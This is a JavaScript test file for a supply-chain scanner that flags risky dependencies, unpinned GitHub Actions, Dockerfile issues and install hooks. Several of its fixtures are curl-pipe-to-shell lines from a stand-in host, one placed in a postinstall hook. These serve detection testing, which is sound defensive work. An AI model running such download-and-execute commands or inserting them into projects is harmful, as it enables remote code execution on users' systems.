import test from 'node:test';
import assert from 'node:assert/strict';

import { analyzeDependencies, DEP_STATE } from '../src/engine/rules/supplyChain.js';
import { inspectProject } from '../src/engine/inspectionEngine.js';
import { buildDependencyGraph } from '../src/engine/graphBuilder.js';

const pkg = (obj) => JSON.stringify(obj, null, 2);

test('flags git and URL dependencies as SUSPICIOUS, never as malicious', () => {
  const { findings } = analyzeDependencies([
    { path: 'package.json', content: pkg({ dependencies: { 'helper-lib': 'github:some-org/helper-lib#main' } }) },
  ]);
  const f = findings.find((x) => /URL or git source/.test(x.title));
  assert.ok(f, 'git dependency must be flagged');
  assert.ok(f.evidence.some((e) => e.includes(DEP_STATE.SUSPICIOUS)));
  assert.ok(!/malicious/i.test(f.potentialConsequence), 'must not claim malicious intent');
  assert.match(f.recommendedControl, /Pin to an immutable commit SHA/);
});

test('unpinned ranges are UNVERIFIED without a lockfile, UNKNOWN with one', () => {
  const without = analyzeDependencies([
    { path: 'package.json', content: pkg({ dependencies: { cheerio: '^1.0.0' } }) },
  ]).findings.find((x) => /unpinned dependency range/.test(x.title));
  assert.ok(without.evidence.some((e) => e.includes(DEP_STATE.UNVERIFIED)));

  const withLock = analyzeDependencies([
    { path: 'package.json', content: pkg({ dependencies: { cheerio: '^1.0.0' } }) },
    { path: 'package-lock.json', content: '{}' },
  ]);
  const f = withLock.findings.find((x) => /unpinned dependency range/.test(x.title));
  assert.ok(f.evidence.some((e) => e.includes(DEP_STATE.UNKNOWN)));
  assert.equal(withLock.hasLockfile, true);
  assert.ok(f.severity <= 2, 'with a lockfile the severity drops');
});

test('flags install lifecycle hooks as install-time execution', () => {
  const { findings } = analyzeDependencies([
    { path: 'package.json', content: pkg({ scripts: { postinstall: 'node ./scripts/setup.js' }, dependencies: {} }) },
  ]);
  const f = findings.find((x) => /lifecycle scripts/.test(x.title));
  assert.ok(f);
  assert.equal(f.defaultDecision, 'REQUIRE_APPROVAL');
  assert.match(f.potentialConsequence, /Installation becomes code execution/);
});

test('lists dependencies without making a trust claim', () => {
  const { findings } = analyzeDependencies([
    { path: 'package.json', content: pkg({ dependencies: { yaml: '2.5.1' } }) },
  ]);
  const inventory = findings.find((x) => /declares 1 dependencies/.test(x.title));
  assert.ok(inventory);
  assert.equal(inventory.defaultDecision, 'ALLOW');
  assert.ok(inventory.evidence.some((e) => /does not make a trust claim/.test(e)));
});

test('flags unpinned GitHub Actions', () => {
  const { findings } = analyzeDependencies([
    { path: '.github/workflows/ci.yml', content: 'steps:\n  - uses: actions/checkout@v4\n  - uses: other/tool@main\n' },
  ]);
  const f = findings.find((x) => /pins .* by tag, not by SHA/.test(x.title));
  assert.ok(f);
  assert.equal(f.defaultDecision, 'REQUIRE_APPROVAL');
});

test('flags download-and-execute in CI as DENY', () => {
  const { findings } = analyzeDependencies([
    { path: '.github/workflows/ci.yml', content: 'steps:\n  - run: curl -fsSL https://x.example/i.sh | bash\n' },
  ]);
  const f = findings.find((x) => /pipes a download into a shell/.test(x.title));
  assert.ok(f);
  assert.equal(f.defaultDecision, 'DENY');
});

test('flags unpinned base images, remote ADD and root containers', () => {
  const { findings } = analyzeDependencies([
    { path: 'Dockerfile', content: 'FROM node:latest\nUSER root\nADD https://x.example/a.tgz /a\nRUN curl https://x.example/i.sh | sh\n' },
  ]);
  const titles = findings.map((f) => f.title).join(' | ');
  assert.match(titles, /unpinned base image/);
  assert.match(titles, /runs as root/);
  assert.match(titles, /downloads and executes content/);
});

test('flags unpinned Python requirements and VCS installs', () => {
  const { findings } = analyzeDependencies([
    { path: 'requirements.txt', content: 'requests\nflask>=2.0\ngit+https://github.com/x/y.git\n' },
  ]);
  assert.ok(findings.some((f) => /unpinned Python requirement/.test(f.title)));
  assert.ok(findings.some((f) => /Python packages from URL or VCS/.test(f.title)));
});

test('an unreadable manifest is reported, not silently ignored', () => {
  const { findings } = analyzeDependencies([{ path: 'package.json', content: '{ not json' }]);
  const f = findings.find((x) => /not valid JSON/.test(x.title));
  assert.ok(f);
  assert.match(f.potentialConsequence, /unknown is not the same as safe/i);
});

test('dependency graph separates pinned from unpinned and shows lockfile state', () => {
  const graph = buildDependencyGraph([
    { path: 'package.json', content: pkg({ dependencies: { a: '1.2.3', b: '^2.0.0', c: 'github:o/r' } }) },
    { path: 'package-lock.json', content: '{}' },
  ], true);
  assert.equal(graph.stats.dependencies, 3);
  assert.equal(graph.stats.unpinned, 1);
  assert.equal(graph.stats.remote, 1);
  assert.equal(graph.stats.hasLockfile, true);
  assert.ok(graph.nodes.some((n) => n.kind === 'lockfile' && n.present === true));
});

test('supply-chain findings appear in a project inspection', () => {
  const report = inspectProject({
    sources: [{ path: 'package.json', content: pkg({ dependencies: { x: 'latest' }, scripts: { postinstall: 'curl https://x.example/i.sh | sh' } }) }],
    options: { workspace: '/p' },
  });
  assert.ok(report.stats.byRule.R014 >= 2);
  assert.ok(report.risk.dimensions.supply_chain_risk.score > 0);
});
